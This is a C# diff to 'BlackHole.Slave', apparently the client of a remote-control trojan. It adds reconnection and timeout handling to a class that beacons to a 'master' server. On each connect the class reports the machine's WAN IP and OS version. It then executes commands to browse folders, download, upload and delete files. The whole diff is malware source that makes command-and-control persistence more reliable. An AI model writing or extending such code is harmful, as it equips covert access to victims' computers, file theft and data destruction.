@@ -4,6 +4,7 @@ using NetMQ;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Net;
@@ -17,22 +18,31 @@ namespace BlackHole.Slave
     /// </summary>
     public sealed class MasterServer
     {
+        public const int DISCONNECTION_TIMEOUT = 5000;
         public const int SEND_INTERVAL = 10;
+        public const int RECEIVE_INTERVAL = 10;
+
+        private Stopwatch m_receiveTimer;
         private NetMQContext m_netContext;
         private NetMQSocket m_client;
         private Poller m_poller;
         private ConcurrentQueue<NetMQMessage> m_sendQueue = new ConcurrentQueue<NetMQMessage>();
+        private string m_serverAddress;
+        private bool m_connected = false;
+        private long m_lastReceived = -1;
 
         /// <summary>
         /// 
         /// </summary>
         public MasterServer(NetMQContext context, string serverAddress)
         {
+            m_serverAddress = serverAddress;
             m_netContext = context;
             m_client = m_netContext.CreateDealerSocket();
             m_client.Options.Linger = TimeSpan.Zero;
-            m_client.Options.ReconnectInterval = TimeSpan.FromMilliseconds(500);
-            m_client.ReceiveReady += Client_ReceiveReady;
+            m_client.ReceiveReady += ClientReceive;
+
+            m_receiveTimer = Stopwatch.StartNew();
 
             var sendTimer = new NetMQTimer(SEND_INTERVAL);
             sendTimer.Elapsed += SendQueue;
@@ -42,8 +52,15 @@ namespace BlackHole.Slave
             m_poller.AddTimer(sendTimer);
             m_poller.AddSocket(m_client);
             m_poller.PollTillCancelledNonBlocking();
+            Connect();
+        }
 
-            m_client.Connect(serverAddress);
+        /// <summary>
+        /// 
+        /// </summary>
+        private void Connect()
+        {
+            m_client.Connect(m_serverAddress);
             Send(new GreetTheMasterMessage()
             {
                 Ip = Utility.GetWanIp(),
@@ -52,6 +69,7 @@ namespace BlackHole.Slave
                 OperatingSystem = Environment.OSVersion.VersionString
             });
         }
+    
 
         /// <summary>
         /// 
@@ -68,6 +86,40 @@ namespace BlackHole.Slave
                     m_client.TrySendMultipartMessage(message);
                 i--;
             }
+
+            if(m_receiveTimer.ElapsedMilliseconds - m_lastReceived > DISCONNECTION_TIMEOUT && m_connected)
+            {
+                UpdateLastReceived();
+                SetDisconnected();
+                Connect();
+            }
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        private void SetConnected()
+        {
+            m_connected = true;
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        private void SetDisconnected()
+        {
+            m_connected = false;
+            ClearSendQueue();
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        private void ClearSendQueue()
+        {
+            NetMQMessage msg = null;
+            while (m_sendQueue.Count > 0)
+                m_sendQueue.TryDequeue(out msg);
         }
 
         /// <summary>
@@ -79,11 +131,19 @@ namespace BlackHole.Slave
         /// <summary>
         /// 
         /// </summary>
+        private void UpdateLastReceived() => m_lastReceived = m_receiveTimer.ElapsedMilliseconds;
+
+        /// <summary>
+        /// 
+        /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void Client_ReceiveReady(object sender, NetMQSocketEventArgs e)
+        private void ClientReceive(object sender, NetMQSocketEventArgs e)
         {
-            var frames = e.Socket.ReceiveMultipartMessage();
+            UpdateLastReceived();
+            SetConnected();
+
+            var frames = m_client.ReceiveMultipartMessage();            
             var message = NetMessage.Deserialize(frames.Last.Buffer);
             message.Match()
                 .With<DoYourDutyMessage>(DoYourDuty)
@@ -91,7 +151,11 @@ namespace BlackHole.Slave
                 .With<NavigateToFolderMessage>(NavigateToFolder)
                 .With<DownloadFilePartMessage>(DownloadFilePart)
                 .With<UploadFileMessage>(UploadFile)
-                .With<DeleteFileMessage>(DeleteFile);
+                .With<DeleteFileMessage>(DeleteFile)
+                .Default(m =>
+                {
+
+                });
         }
 
 
